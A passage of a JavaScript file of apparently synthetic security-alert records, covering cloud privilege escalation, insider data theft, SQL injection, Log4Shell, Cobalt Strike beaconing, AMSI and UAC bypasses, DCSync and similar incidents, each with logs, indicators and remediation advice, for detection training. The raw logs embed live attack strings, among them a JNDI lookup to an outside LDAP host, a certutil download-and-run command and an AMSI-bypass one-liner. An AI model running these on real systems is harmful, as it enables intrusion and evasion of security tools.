      { time:'12:00:00', event:'PutBucketAcl sets public-read on corp-payroll-backups' },
      { time:'12:00:05', event:'CloudTrail alert fires — no change ticket found' },
      { time:'12:05:00', event:'External enumeration tools begin probing bucket' },
    ]),
    network_flow: JSON.stringify({ src:'52.94.1.100', dst:'s3.amazonaws.com', proto:'HTTPS', bytes_sent:2000, bytes_recv:1500 }),
    recommendations: 'Immediately set bucket to private, audit recent GetObject calls, rotate devops-ci-role credentials.',
  },
  {
    id: 'ALT-021', severity: 'medium', category: 'Cloud Security',
    title: 'Suspicious IAM Policy — Admin Privilege Escalation',
    source: 'AWS CloudTrail', host: 'aws/iam', src_ip: '103.21.58.200',
    dst_ip: 'N/A', user: 'dev-user-arpita', process: 'N/A',
    event_id: null, mitre_tactic: 'Privilege Escalation', mitre_technique: 'T1484.001',
    status: 'open', timestamp: '2024-03-16T16:30:00Z',
    description: 'dev-user-arpita called PutUserPolicy attaching AdministratorAccess policy to their own IAM user — self-escalation. User has no business need for admin access.',
    raw_log: '{"eventName":"PutUserPolicy","userIdentity":{"userName":"dev-user-arpita"},"requestParameters":{"userName":"dev-user-arpita","policyName":"AdministratorAccess","policyDocument":"{\\"Version\\":\\"2012-10-17\\",\\"Statement\\":[{\\"Effect\\":\\"Allow\\",\\"Action\\":\\"*\\",\\"Resource\\":\\"*\\"}]}"},"sourceIPAddress":"103.21.58.200"}',
    iocs: JSON.stringify(['dev-user-arpita','PutUserPolicy','AdministratorAccess','self-escalation','103.21.58.200']),
    timeline: JSON.stringify([
      { time:'16:30:00', event:'PutUserPolicy — AdministratorAccess attached to self' },
      { time:'16:30:05', event:'CloudTrail alert fires' },
      { time:'16:32:00', event:'dev-user-arpita calls ListBuckets across all regions' },
    ]),
    network_flow: JSON.stringify({ src:'103.21.58.200', dst:'iam.amazonaws.com', proto:'HTTPS', bytes_sent:1200, bytes_recv:800 }),
    recommendations: 'Revoke AdministratorAccess immediately, suspend dev-user-arpita, audit actions taken post-escalation.',
  },

  // ── INSIDER THREAT ────────────────────────────────────
  {
    id: 'ALT-022', severity: 'high', category: 'Insider Threat',
    title: 'Unusual Off-Hours File Access — Terminated Employee',
    source: 'CASB / SharePoint Logs', host: 'sharepoint.corp.local', src_ip: '192.168.5.200',
    dst_ip: 'N/A', user: 'kpatel', process: 'N/A',
    event_id: null, mitre_tactic: 'Collection', mitre_technique: 'T1213',
    status: 'open', timestamp: '2024-03-17T01:55:00Z',
    description: 'kpatel (HR offboarding initiated 2 days ago — account not yet disabled) accessed and downloaded 420 files from the Product roadmap and Customer PII SharePoint sites at 1:55 AM.',
    raw_log: '{"User":"kpatel","Action":"FileDownload","SiteCollection":"Product-Roadmap,Customer-PII","FilesAccessed":420,"OffboardingStatus":"in_progress","AccountStatus":"active","Time":"01:55 AM","SourceIP":"192.168.5.200"}',
    iocs: JSON.stringify(['kpatel','420 files','1:55 AM','offboarding in progress','Product-Roadmap','Customer-PII']),
    timeline: JSON.stringify([
      { time:'01:55:00', event:'kpatel downloads from Product-Roadmap — alert fired' },
      { time:'02:10:00', event:'kpatel moves to Customer-PII site — 280 more files' },
      { time:'02:22:00', event:'Session ends — total 420 files downloaded' },
    ]),
    network_flow: JSON.stringify({ src:'192.168.5.200', dst:'sharepoint.corp.local:443', proto:'HTTPS', bytes_sent:180000, bytes_recv:2100000000 }),
    recommendations: 'Disable kpatel immediately, preserve download logs, notify legal, check personal cloud storage accounts.',
  },

  // ── WEB APPLICATION ───────────────────────────────────
  {
    id: 'ALT-023', severity: 'critical', category: 'Web Application',
    title: 'SQL Injection — Customer Database',
    source: 'WAF / App Logs', host: 'app01.corp.local', src_ip: '185.100.87.50',
    dst_ip: '10.10.20.5', user: 'anonymous', process: 'httpd',
    event_id: null, mitre_tactic: 'Collection', mitre_technique: 'T1190',
    status: 'open', timestamp: '2024-03-15T15:22:00Z',
    description: 'sqlmap automated SQLi against /api/users endpoint. UNION-based injection confirmed. 50,000 customer records (name, email, bcrypt hashes) returned in HTTP response.',
    raw_log: '{"Method":"GET","URI":"/api/users?id=1 UNION SELECT table_name,2,3 FROM information_schema.tables--","StatusCode":200,"ResponseSize":4200000,"Tool":"sqlmap/1.7","InjectionType":"UNION","RecordsLeaked":50000,"SourceIP":"185.100.87.50"}',
    iocs: JSON.stringify(['185.100.87.50','sqlmap','UNION SELECT','information_schema','50000 records']),
    timeline: JSON.stringify([
      { time:'15:10:00', event:'sqlmap begins crawling /api endpoints' },
      { time:'15:22:00', event:'UNION injection confirmed — customer table exposed' },
      { time:'15:24:00', event:'50,000 records extracted — alert fired' },
    ]),
    network_flow: JSON.stringify({ src:'185.100.87.50:random', dst:'10.10.20.5:443', proto:'HTTPS', bytes_sent:120000, bytes_recv:4200000 }),
    recommendations: 'Block 185.100.87.50, patch SQL injection in /api/users, notify affected customers, initiate breach assessment.',
  },
  {
    id: 'ALT-024', severity: 'high', category: 'Web Application',
    title: 'Log4Shell Exploitation — CVE-2021-44228',
    source: 'WAF / IDS', host: 'app-java-01.corp.local', src_ip: '194.165.16.80',
    dst_ip: '10.10.20.8', user: 'N/A', process: 'java',
    event_id: null, mitre_tactic: 'Initial Access', mitre_technique: 'T1190',
    status: 'open', timestamp: '2024-03-16T09:44:00Z',
    description: 'Log4Shell JNDI injection in User-Agent header: ${jndi:ldap://194.165.16.80:1389/a}. Java application made outbound LDAP connection to attacker server. RCE confirmed.',
    raw_log: '{"UserAgent":"${jndi:ldap://194.165.16.80:1389/a}","TargetHost":"app-java-01.corp.local","CVE":"CVE-2021-44228","OutboundLDAP":"194.165.16.80:1389","RCEConfirmed":true,"JavaVersion":"1.8.0_181","Log4jVersion":"2.14.1"}',
    iocs: JSON.stringify(['${jndi:ldap://','194.165.16.80','CVE-2021-44228','log4j 2.14.1','java 1.8.0_181']),
    timeline: JSON.stringify([
      { time:'09:44:00', event:'JNDI injection in User-Agent — WAF alert fired' },
      { time:'09:44:02', event:'app-java-01 makes outbound LDAP to 194.165.16.80:1389' },
      { time:'09:44:05', event:'LDAP response delivers Java class — RCE executed' },
    ]),
    network_flow: JSON.stringify({ src:'194.165.16.80:random', dst:'10.10.20.8:8080', proto:'HTTP', bytes_sent:1200, bytes_recv:48000 }),
    recommendations: 'Isolate app-java-01, patch Log4j to 2.17.1+, block 194.165.16.80, review all Java apps for Log4j versions.',
  },

  // ── NETWORK THREATS ───────────────────────────────────
  {
    id: 'ALT-025', severity: 'high', category: 'Network',
    title: 'C2 Beaconing — Cobalt Strike Watermark',
    source: 'Network IDS / Zeek', host: 'WS-MKTG-04.corp.local', src_ip: '10.10.10.55',
    dst_ip: '172.67.68.100', user: 'N/A', process: 'N/A',
    event_id: null, mitre_tactic: 'Command and Control', mitre_technique: 'T1071.001',
    status: 'open', timestamp: '2024-03-15T11:00:00Z',
    description: 'HTTPS traffic to 172.67.68.100 showing Cobalt Strike beacon pattern — jitter 0-10%, 60s interval, malleable C2 profile. Watermark ID 305419896 (leaked CS license).',
    raw_log: '{"BeaconInterval":60,"Jitter":"0-10%","WatermarkID":305419896,"MalleableProfile":"jquery-c2.profile","DestinationIP":"172.67.68.100","DestinationPort":443,"Protocol":"HTTPS","TLSFingerprint":"JA3:a0e9f5d64349fb13191bc781f81f42e1","Host":"WS-MKTG-04"}',
    iocs: JSON.stringify(['172.67.68.100','Cobalt Strike watermark 305419896','JA3:a0e9f5d64349fb13191bc781f81f42e1','60s beacon','10.10.10.55']),
    timeline: JSON.stringify([
      { time:'11:00:00', event:'First CS beacon to 172.67.68.100 detected' },
      { time:'11:01:00', event:'Second beacon — pattern confirmed — alert fired' },
      { time:'11:30:00', event:'30 beacons recorded, no commands issued yet' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.10.55:53432', dst:'172.67.68.100:443', proto:'HTTPS/TLS', bytes_sent:12000, bytes_recv:8000 }),
    recommendations: 'Isolate WS-MKTG-04, block 172.67.68.100, hunt for CS artifacts (beacon DLL, named pipes).',
  },
  {
    id: 'ALT-026', severity: 'high', category: 'Network',
    title: 'TOR Exit Node Traffic — Data Exfiltration Risk',
    source: 'Firewall / Proxy', host: 'WS-DEV-07.corp.local', src_ip: '10.10.12.3',
    dst_ip: '185.220.101.1', user: 'nkumar', process: 'tor.exe',
    event_id: null, mitre_tactic: 'Exfiltration', mitre_technique: 'T1090.003',
    status: 'open', timestamp: '2024-03-16T20:00:00Z',
    description: 'tor.exe making connections to known TOR exit nodes. 800 MB outbound in 45 minutes. Destination IPs match TOR consensus list updated hourly by threat intel.',
    raw_log: '{"Process":"tor.exe","SourceHost":"WS-DEV-07","User":"nkumar","BytesSent":838860800,"Duration":"45min","TORNodesHit":12,"DestinationIPs":["185.220.101.1","185.220.102.8","185.107.47.215"]}',
    iocs: JSON.stringify(['tor.exe','185.220.101.1','800MB outbound','nkumar','TOR exit nodes']),
    timeline: JSON.stringify([
      { time:'20:00:00', event:'tor.exe starts — connects to TOR bootstrap nodes' },
      { time:'20:10:00', event:'Outbound data flow begins — alert fired' },
      { time:'20:45:00', event:'800MB transferred through TOR' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.12.3:9050', dst:'185.220.101.1:443', proto:'TOR/HTTPS', bytes_sent:838860800, bytes_recv:102400 }),
    recommendations: 'Block TOR at firewall, isolate WS-DEV-07, investigate nkumar, preserve data for forensics.',
  },

  // ── ENDPOINT ──────────────────────────────────────────
  {
    id: 'ALT-027', severity: 'medium', category: 'Defense Evasion',
    title: 'Windows Defender Disabled via Registry',
    source: 'Sysmon / EDR', host: 'WS-OPS-12.corp.local', src_ip: '10.10.6.88',
    dst_ip: 'N/A', user: 'SYSTEM', process: 'reg.exe',
    event_id: 13, mitre_tactic: 'Defense Evasion', mitre_technique: 'T1562.001',
    status: 'open', timestamp: '2024-03-15T19:55:00Z',
    description: 'Registry key HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware set to 1. Windows Defender real-time protection disabled. No GPO change exists.',
    raw_log: '{"EventID":13,"TargetObject":"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\DisableAntiSpyware","Details":"DWORD (0x00000001)","Process":"reg.exe","User":"SYSTEM","Host":"WS-OPS-12"}',
    iocs: JSON.stringify(['DisableAntiSpyware=1','reg.exe','SYSTEM','10.10.6.88','no GPO change']),
    timeline: JSON.stringify([
      { time:'19:54:00', event:'Malware running as SYSTEM on WS-OPS-12' },
      { time:'19:55:00', event:'Defender disabled via registry — alert fired' },
      { time:'19:55:10', event:'Additional malware dropped — no AV detection' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.6.88', dst:'N/A', proto:'local', bytes_sent:0, bytes_recv:0 }),
    recommendations: 'Re-enable Defender, isolate host, hunt for malware dropped post-disable, investigate SYSTEM compromise.',
  },
  {
    id: 'ALT-028', severity: 'medium', category: 'Defense Evasion',
    title: 'AMSI Bypass — Patching amsi.dll in Memory',
    source: 'EDR / PowerShell Logs', host: 'WS-IT-06.corp.local', src_ip: '10.10.3.60',
    dst_ip: 'N/A', user: 'tthorat', process: 'powershell.exe',
    event_id: 4104, mitre_tactic: 'Defense Evasion', mitre_technique: 'T1562.001',
    status: 'open', timestamp: '2024-03-16T15:10:00Z',
    description: 'PowerShell script patched AMSI.dll AmsiScanBuffer to always return AMSI_RESULT_CLEAN. Classic Matt Graeber AMSI bypass. Subsequent scripts run without scanning.',
    raw_log: '{"EventID":4104,"ScriptBlock":"[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)","User":"tthorat","Host":"WS-IT-06","AMSIBypassed":true}',
    iocs: JSON.stringify(['amsiInitFailed','AmsiUtils','amsiScanBuffer patch','tthorat','10.10.3.60']),
    timeline: JSON.stringify([
      { time:'15:10:00', event:'AMSI bypass script executed — alert fired' },
      { time:'15:10:05', event:'AMSI disabled for current PowerShell session' },
      { time:'15:11:00', event:'Encoded payload executes without AV scan' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.3.60', dst:'N/A', proto:'local', bytes_sent:0, bytes_recv:0 }),
    recommendations: 'Terminate PowerShell session, investigate subsequent commands, check for payload delivery.',
  },
  {
    id: 'ALT-029', severity: 'high', category: 'Privilege Escalation',
    title: 'Token Impersonation — PrintSpoofer',
    source: 'EDR / Sysmon', host: 'WS-DEV-05.corp.local', src_ip: '10.10.12.20',
    dst_ip: 'N/A', user: 'webapp_svc', process: 'PrintSpoofer.exe',
    event_id: 4688, mitre_tactic: 'Privilege Escalation', mitre_technique: 'T1134.001',
    status: 'open', timestamp: '2024-03-17T10:22:00Z',
    description: 'PrintSpoofer.exe exploited SeImpersonatePrivilege to impersonate SYSTEM token. webapp_svc (a low-privilege service account) escalated to SYSTEM within 3 seconds.',
    raw_log: '{"Process":"PrintSpoofer.exe","User":"webapp_svc","Privilege":"SeImpersonatePrivilege","EscalatedTo":"SYSTEM","Technique":"PrinterBug/Token Impersonation","CommandLine":"PrintSpoofer.exe -i -c cmd.exe","Host":"WS-DEV-05"}',
    iocs: JSON.stringify(['PrintSpoofer.exe','SeImpersonatePrivilege','webapp_svc->SYSTEM','10.10.12.20']),
    timeline: JSON.stringify([
      { time:'10:22:00', event:'PrintSpoofer.exe executed by webapp_svc' },
      { time:'10:22:03', event:'SYSTEM token impersonated — alert fired' },
      { time:'10:22:05', event:'SYSTEM cmd.exe shell spawned' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.12.20', dst:'N/A', proto:'local', bytes_sent:0, bytes_recv:0 }),
    recommendations: 'Kill PrintSpoofer process, patch PrintSpooler service, remove SeImpersonatePrivilege from webapp_svc.',
  },
  {
    id: 'ALT-030', severity: 'high', category: 'Privilege Escalation',
    title: 'UAC Bypass — fodhelper.exe Registry Hijack',
    source: 'Sysmon / EDR', host: 'WS-FINANCE-08.corp.local', src_ip: '10.10.5.76',
    dst_ip: 'N/A', user: 'kdesai', process: 'fodhelper.exe',
    event_id: 4688, mitre_tactic: 'Privilege Escalation', mitre_technique: 'T1548.002',
    status: 'open', timestamp: '2024-03-15T17:30:00Z',
    description: 'fodhelper.exe spawned cmd.exe with elevated privileges after registry key HKCU\\ms-settings\\shell\\open\\command was set to cmd.exe. Standard UAC bypass — no dialog shown.',
    raw_log: '{"EventID":4688,"Process":"fodhelper.exe","ChildProcess":"cmd.exe","IntegrityLevel":"High","RegistryKey":"HKCU\\\\ms-settings\\\\shell\\\\open\\\\command","RegistryValue":"cmd.exe","TokenElevation":"Full","UAC_Bypassed":true}',
    iocs: JSON.stringify(['fodhelper.exe','ms-settings\\shell\\open\\command','UAC bypass','kdesai','10.10.5.76']),
    timeline: JSON.stringify([
      { time:'17:28:00', event:'HKCU registry key set to cmd.exe' },
      { time:'17:30:00', event:'fodhelper.exe spawns elevated cmd.exe — alert fired' },
      { time:'17:30:05', event:'High-integrity cmd.exe begins recon commands' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.5.76', dst:'N/A', proto:'local', bytes_sent:0, bytes_recv:0 }),
    recommendations: 'Kill elevated cmd.exe, clean registry key, investigate kdesai account for initial compromise.',
  },

  // ── MORE VARIED SCENARIOS ────────────────────────────
  {
    id: 'ALT-031', severity: 'medium', category: 'Execution',
    title: 'Living-off-the-Land — certutil.exe Download',
    source: 'Sysmon / EDR', host: 'WS-LEGAL-05.corp.local', src_ip: '10.10.11.55',
    dst_ip: '45.33.32.156', user: 'pjoshi', process: 'certutil.exe',
    event_id: 4688, mitre_tactic: 'Defense Evasion', mitre_technique: 'T1218.013',
    status: 'open', timestamp: '2024-03-16T13:05:00Z',
    description: 'certutil.exe -urlcache -split -f used to download binary from external IP. LOLBin abuse to bypass application whitelisting and download malware.',
    raw_log: '{"Process":"certutil.exe","CommandLine":"certutil.exe -urlcache -split -f http://45.33.32.156/update.exe C:\\Windows\\Temp\\update.exe","User":"pjoshi","DownloadedFile":"update.exe","FileSize":245760,"Entropy":7.91}',
    iocs: JSON.stringify(['certutil.exe -urlcache','45.33.32.156','update.exe','entropy:7.91','pjoshi']),
    timeline: JSON.stringify([
      { time:'13:05:00', event:'certutil.exe downloads update.exe — alert fired' },
      { time:'13:05:10', event:'update.exe written to C:\\Windows\\Temp' },
      { time:'13:05:15', event:'update.exe executes — outbound C2 connection' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.11.55:56789', dst:'45.33.32.156:80', proto:'HTTP', bytes_sent:1200, bytes_recv:245760 }),
    recommendations: 'Block 45.33.32.156, delete update.exe, investigate pjoshi account, add certutil to SIEM watchlist.',
  },
  {
    id: 'ALT-032', severity: 'medium', category: 'Discovery',
    title: 'BloodHound — AD Attack Path Enumeration',
    source: 'EDR / Windows Security', host: 'WS-DEV-09.corp.local', src_ip: '10.10.12.50',
    dst_ip: '10.10.1.10', user: 'srao', process: 'SharpHound.exe',
    event_id: 4662, mitre_tactic: 'Discovery', mitre_technique: 'T1069.002',
    status: 'open', timestamp: '2024-03-17T00:30:00Z',
    description: 'SharpHound.exe collected BloodHound data — all user sessions, group memberships, ACLs, and GPOs dumped to JSON. 1,200 users, 340 computers, 89 GPOs enumerated.',
    raw_log: '{"Process":"SharpHound.exe","CollectionMethod":"All","UsersCollected":1200,"ComputersCollected":340,"GPOsCollected":89,"OutputFile":"20240317_BloodHound.zip","LDAPQueries":2840,"Duration":"4min","User":"srao"}',
    iocs: JSON.stringify(['SharpHound.exe','BloodHound','20240317_BloodHound.zip','2840 LDAP queries','srao']),
    timeline: JSON.stringify([
      { time:'00:30:00', event:'SharpHound.exe starts AD collection' },
      { time:'00:34:00', event:'Collection complete — BloodHound zip created — alert fired' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.12.50:60001', dst:'10.10.1.10:389', proto:'LDAP', bytes_sent:45000, bytes_recv:8400000 }),
    recommendations: 'Investigate srao, delete BloodHound zip, alert on future SharpHound execution, review attack paths.',
  },
  {
    id: 'ALT-033', severity: 'critical', category: 'Ransomware',
    title: 'REvil Ransomware — Affiliate IOCs Detected',
    source: 'EDR / Threat Intel', host: 'multiple', src_ip: '10.10.3.44',
    dst_ip: 'N/A', user: 'SYSTEM', process: 'taskhost.exe (renamed)',
    event_id: null, mitre_tactic: 'Impact', mitre_technique: 'T1486',
    status: 'open', timestamp: '2024-03-17T04:00:00Z',
    description: 'REvil ransomware binary detected on 4 hosts. SHA256 matches known REvil affiliate sample. Encryption not started yet — caught pre-execution by EDR behavioral engine.',
    raw_log: '{"SHA256":"c8b5a68f1e2d3a4b5c6d7e8f9a0b1c2d","Family":"REvil/Sodinokibi","Stage":"pre-encryption","HostsAffected":["WS-FIN-01","WS-FIN-02","WS-OPS-03","FS02"],"DroppedBy":"taskhost.exe","C2":"hxxp://malware[.]site/panel","RansomNote":"not_yet_dropped"}',
    iocs: JSON.stringify(['c8b5a68f1e2d3a4b5c6d7e8f9a0b1c2d','REvil','taskhost.exe renamed','hxxp://malware.site/panel','4 hosts']),
    timeline: JSON.stringify([
      { time:'03:55:00', event:'Renamed taskhost.exe drops to 4 hosts via SMB' },
      { time:'04:00:00', event:'EDR behavioral engine flags pre-encryption activity — alert fired' },
      { time:'04:00:05', event:'EDR quarantines binary on 4 hosts — encryption prevented' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.3.44', dst:'multiple', proto:'SMB', bytes_sent:982016, bytes_recv:0 }),
    recommendations: 'Verify quarantine on all 4 hosts, hunt for additional copies, identify lateral movement path, patch SMB.',
  },
  {
    id: 'ALT-034', severity: 'high', category: 'Exfiltration',
    title: 'Email Forwarding Rule — Auto-Forward to Gmail',
    source: 'Exchange / O365 Audit', host: 'exchange.corp.local', src_ip: '10.10.9.88',
    dst_ip: 'N/A', user: 'vpandey', process: 'N/A',
    event_id: null, mitre_tactic: 'Collection', mitre_technique: 'T1114.003',
    status: 'open', timestamp: '2024-03-16T07:00:00Z',
    description: 'New Inbox rule created by vpandey forwarding ALL emails to vpandey.backup@gmail.com — a non-corporate address. Rule created at 3 AM from an IP not used by vpandey previously.',
    raw_log: '{"Action":"New-InboxRule","User":"vpandey","RuleName":"Backup","Condition":"ForwardTo vpandey.backup@gmail.com","ForwardAll":true,"CreationTime":"03:00 AM","SourceIP":"185.220.100.250","PreviousLogins":"none from this IP"}',
    iocs: JSON.stringify(['vpandey','vpandey.backup@gmail.com','New-InboxRule','ForwardAll','185.220.100.250']),
    timeline: JSON.stringify([
      { time:'03:00:00', event:'vpandey login from 185.220.100.250 (unknown IP)' },
      { time:'03:00:30', event:'Inbox forwarding rule created — all email to Gmail' },
      { time:'07:00:00', event:'O365 audit rule detects forward-to-external — alert fired' },
    ]),
    network_flow: JSON.stringify({ src:'185.220.100.250', dst:'outlook.office365.com:443', proto:'HTTPS', bytes_sent:2400, bytes_recv:1800 }),
    recommendations: 'Delete forwarding rule, revoke vpandey O365 session, check what was forwarded, reset credentials.',
  },
  {
    id: 'ALT-035', severity: 'medium', category: 'Execution',
    title: 'WMIC Remote Process Execution',
    source: 'Sysmon / Windows Security', host: 'WS-HR-11.corp.local', src_ip: '10.10.9.66',
    dst_ip: '10.10.9.22', user: 'CORP\\admin_svc', process: 'wmic.exe',
    event_id: 4688, mitre_tactic: 'Execution', mitre_technique: 'T1047',
    status: 'open', timestamp: '2024-03-16T23:15:00Z',
    description: 'wmic.exe used to remotely execute cmd.exe on 5 HR workstations. admin_svc account used — no change ticket. Commands include whoami, net user, and dir C:\\Users.',
    raw_log: '{"Process":"wmic.exe","CommandLine":"wmic /node:10.10.9.22 process call create \\"cmd.exe /c whoami > C:\\\\Temp\\\\out.txt\\"","User":"CORP\\\\admin_svc","RemoteHosts":["10.10.9.20","10.10.9.21","10.10.9.22","10.10.9.23","10.10.9.24"],"Commands":["whoami","net user","dir C:\\\\Users"]}',
    iocs: JSON.stringify(['wmic.exe /node','admin_svc','5 HR hosts','whoami','net user','10.10.9.66']),
    timeline: JSON.stringify([
      { time:'23:15:00', event:'wmic remote execution on first HR host — alert fired' },
      { time:'23:18:00', event:'5 HR workstations reached with recon commands' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.9.66:49001', dst:'10.10.9.20-24:135', proto:'DCOM/RPC', bytes_sent:18000, bytes_recv:12000 }),
    recommendations: 'Investigate admin_svc account compromise, check recon output files, restrict WMIC remotely.',
  },

  // ── REMAINING 15 ALERTS ───────────────────────────────
  {
    id: 'ALT-036', severity: 'high', category: 'Credential Access',
    title: 'DCSync Attack — Domain Replication',
    source: 'Windows Security / SIEM', host: 'DC01.corp.local', src_ip: '10.10.8.77',
    dst_ip: '10.10.1.10', user: 'domainadmin_svc', process: 'N/A',
    event_id: 4662, mitre_tactic: 'Credential Access', mitre_technique: 'T1003.006',
    status: 'open', timestamp: '2024-03-17T02:30:00Z',
    description: 'domainadmin_svc called GetNCChanges (DS-Replication-Get-Changes) from a workstation — not a DC. This replicates the NTDS.dit effectively dumping all domain hashes.',
    raw_log: '{"EventID":4662,"ObjectType":"domainDNS","OperationType":"Read","Properties":"DS-Replication-Get-Changes-All","SubjectUserName":"domainadmin_svc","ClientAddress":"10.10.8.77","IsDomainController":false}',
    iocs: JSON.stringify(['domainadmin_svc','DS-Replication-Get-Changes-All','10.10.8.77','non-DC replication','DCSync']),
    timeline: JSON.stringify([
      { time:'02:30:00', event:'DCSync request from non-DC host — alert fired' },
      { time:'02:30:05', event:'All domain password hashes replicated to attacker' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.8.77:49922', dst:'10.10.1.10:445', proto:'MS-DRSR', bytes_sent:12000, bytes_recv:4800000 }),
    recommendations: 'IMMEDIATE: Assume all domain credentials compromised. Rotate ALL passwords including krbtgt (twice).',
  },
  {
    id: 'ALT-037', severity: 'critical', category: 'Persistence',
    title: 'Golden Ticket — Forged Kerberos TGT',
    source: 'Windows Security / SIEM', host: 'DC01.corp.local', src_ip: '10.10.4.55',
    dst_ip: '10.10.1.10', user: 'administrator (forged)', process: 'N/A',
    event_id: 4769, mitre_tactic: 'Credential Access', mitre_technique: 'T1558.001',
    status: 'open', timestamp: '2024-03-17T06:00:00Z',
    description: 'Kerberos TGT presented with 10-year validity and RID 500 but originating from a non-DC host. krbtgt hash was used to forge the ticket. Domain persistence achieved.',
    raw_log: '{"EventID":4769,"TicketValidityPeriod":"10 years","RID":"500 (Administrator)","SourceHost":"WS-IT-ADMIN-03","IsDomainController":false,"EncryptionType":"RC4-HMAC","Anomaly":"validity>20hours from non-DC"}',
    iocs: JSON.stringify(['10-year TGT','RID 500','RC4-HMAC','WS-IT-ADMIN-03','krbtgt compromise']),
    timeline: JSON.stringify([
      { time:'05:55:00', event:'krbtgt hash obtained via DCSync (ALT-036)' },
      { time:'06:00:00', event:'Golden Ticket forged — 10-year TGT — alert fired' },
      { time:'06:00:05', event:'Ticket used to access all domain resources as Administrator' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.4.55:49844', dst:'10.10.1.10:88', proto:'Kerberos', bytes_sent:4800, bytes_recv:9200 }),
    recommendations: 'IMMEDIATE: Reset krbtgt password TWICE (with 10-hour gap). Full domain compromise — initiate IR.',
  },
  {
    id: 'ALT-038', severity: 'medium', category: 'Execution',
    title: 'Macro-Free Phishing — ISO File Delivery',
    source: 'Email Gateway / EDR', host: 'WS-SALES-07.corp.local', src_ip: '10.10.7.88',
    dst_ip: '91.92.240.100', user: 'asingh', process: 'explorer.exe',
    event_id: 4688, mitre_tactic: 'Initial Access', mitre_technique: 'T1566.001',
    status: 'open', timestamp: '2024-03-16T11:44:00Z',
    description: 'ISO file mounted from email (bypasses Mark-of-the-Web). Inside: LNK shortcut triggering rundll32.exe loading malicious DLL. Used to bypass macro restrictions.',
    raw_log: '{"File":"Invoice_Q1.iso","MountedBy":"asingh","LNKTarget":"rundll32.exe payload.dll,EntryPoint","DLL":"payload.dll","MarkOfTheWeb":false,"C2":"91.92.240.100:443","ParentProcess":"explorer.exe"}',
    iocs: JSON.stringify(['Invoice_Q1.iso','payload.dll','rundll32.exe from LNK','no MOTW','91.92.240.100']),
    timeline: JSON.stringify([
      { time:'11:40:00', event:'ISO attached to phishing email — delivered past gateway' },
      { time:'11:44:00', event:'asingh mounts ISO, clicks LNK — rundll32 executes DLL' },
      { time:'11:44:30', event:'C2 connection to 91.92.240.100 — alert fired' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.7.88:55234', dst:'91.92.240.100:443', proto:'HTTPS', bytes_sent:2400, bytes_recv:48000 }),
    recommendations: 'Block ISO mounting via GPO, isolate WS-SALES-07, block 91.92.240.100.',
  },
  {
    id: 'ALT-039', severity: 'high', category: 'Network',
    title: 'ARP Poisoning — MITM on Finance VLAN',
    source: 'Network IDS / Snort', host: 'network/finance-vlan', src_ip: '10.10.5.200',
    dst_ip: '10.10.5.1', user: 'N/A', process: 'N/A',
    event_id: null, mitre_tactic: 'Collection', mitre_technique: 'T1557.002',
    status: 'open', timestamp: '2024-03-16T14:00:00Z',
    description: 'Gratuitous ARP replies from 10.10.5.200 claiming to be gateway 10.10.5.1. All 24 Finance workstations ARP cache poisoned. Attacker in MITM position — able to intercept unencrypted traffic.',
    raw_log: '{"ARPType":"Gratuitous","SenderIP":"10.10.5.200","SenderMAC":"de:ad:be:ef:00:01","TargetIP":"10.10.5.1 (gateway)","AffectedHosts":24,"VLAN":"Finance","InterceptedProtocols":["HTTP","FTP","SMTP"]}',
    iocs: JSON.stringify(['10.10.5.200','gratuitous ARP','de:ad:be:ef:00:01','ARP spoofing','Finance VLAN','24 hosts']),
    timeline: JSON.stringify([
      { time:'14:00:00', event:'Gratuitous ARP from 10.10.5.200 — alert fired' },
      { time:'14:00:30', event:'24 Finance hosts ARP cache poisoned' },
      { time:'14:05:00', event:'HTTP credentials intercepted in plaintext' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.5.200', dst:'broadcast', proto:'ARP', bytes_sent:2400, bytes_recv:0 }),
    recommendations: 'Enable Dynamic ARP Inspection on Finance switches, isolate 10.10.5.200, rotate any credentials sent over HTTP.',
  },
  {
    id: 'ALT-040', severity: 'medium', category: 'Execution',
    title: 'MSBuild.exe — Inline C# Code Execution',
    source: 'Sysmon / EDR', host: 'WS-DEV-02.corp.local', src_ip: '10.10.12.15',
    dst_ip: '45.95.168.200', user: 'dverma', process: 'MSBuild.exe',
    event_id: 4688, mitre_tactic: 'Defense Evasion', mitre_technique: 'T1127.001',
    status: 'open', timestamp: '2024-03-15T21:00:00Z',
    description: 'MSBuild.exe used to compile and execute inline C# shellcode from a .csproj file. LOLBin abuse — MSBuild is a trusted binary that bypasses application whitelisting.',
    raw_log: '{"Process":"MSBuild.exe","CommandLine":"MSBuild.exe malicious.csproj","InlineCode":"[DllImport(\\"ntdll.dll\\")] ... VirtualAlloc shellcode","C2":"45.95.168.200:8443","User":"dverma","Signed":"Microsoft"}',
    iocs: JSON.stringify(['MSBuild.exe','malicious.csproj','inline shellcode','45.95.168.200','dverma']),
    timeline: JSON.stringify([
      { time:'21:00:00', event:'MSBuild.exe executes malicious.csproj — alert fired' },
      { time:'21:00:05', event:'Inline C# compiled and shellcode injected into memory' },
      { time:'21:00:10', event:'C2 beacon to 45.95.168.200:8443' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.12.15:57123', dst:'45.95.168.200:8443', proto:'HTTPS', bytes_sent:3200, bytes_recv:24000 }),
    recommendations: 'Block MSBuild.exe in Applocker for non-developers, isolate WS-DEV-02, block 45.95.168.200.',
  },
  {
    id: 'ALT-041', severity: 'high', category: 'Cloud Security',
    title: 'Azure AD — MFA Fatigue Attack',
    source: 'Azure AD / MCAS', host: 'cloud/azuread', src_ip: '91.108.56.100',
    dst_ip: 'N/A', user: 'rverma', process: 'N/A',
    event_id: null, mitre_tactic: 'Credential Access', mitre_technique: 'T1621',
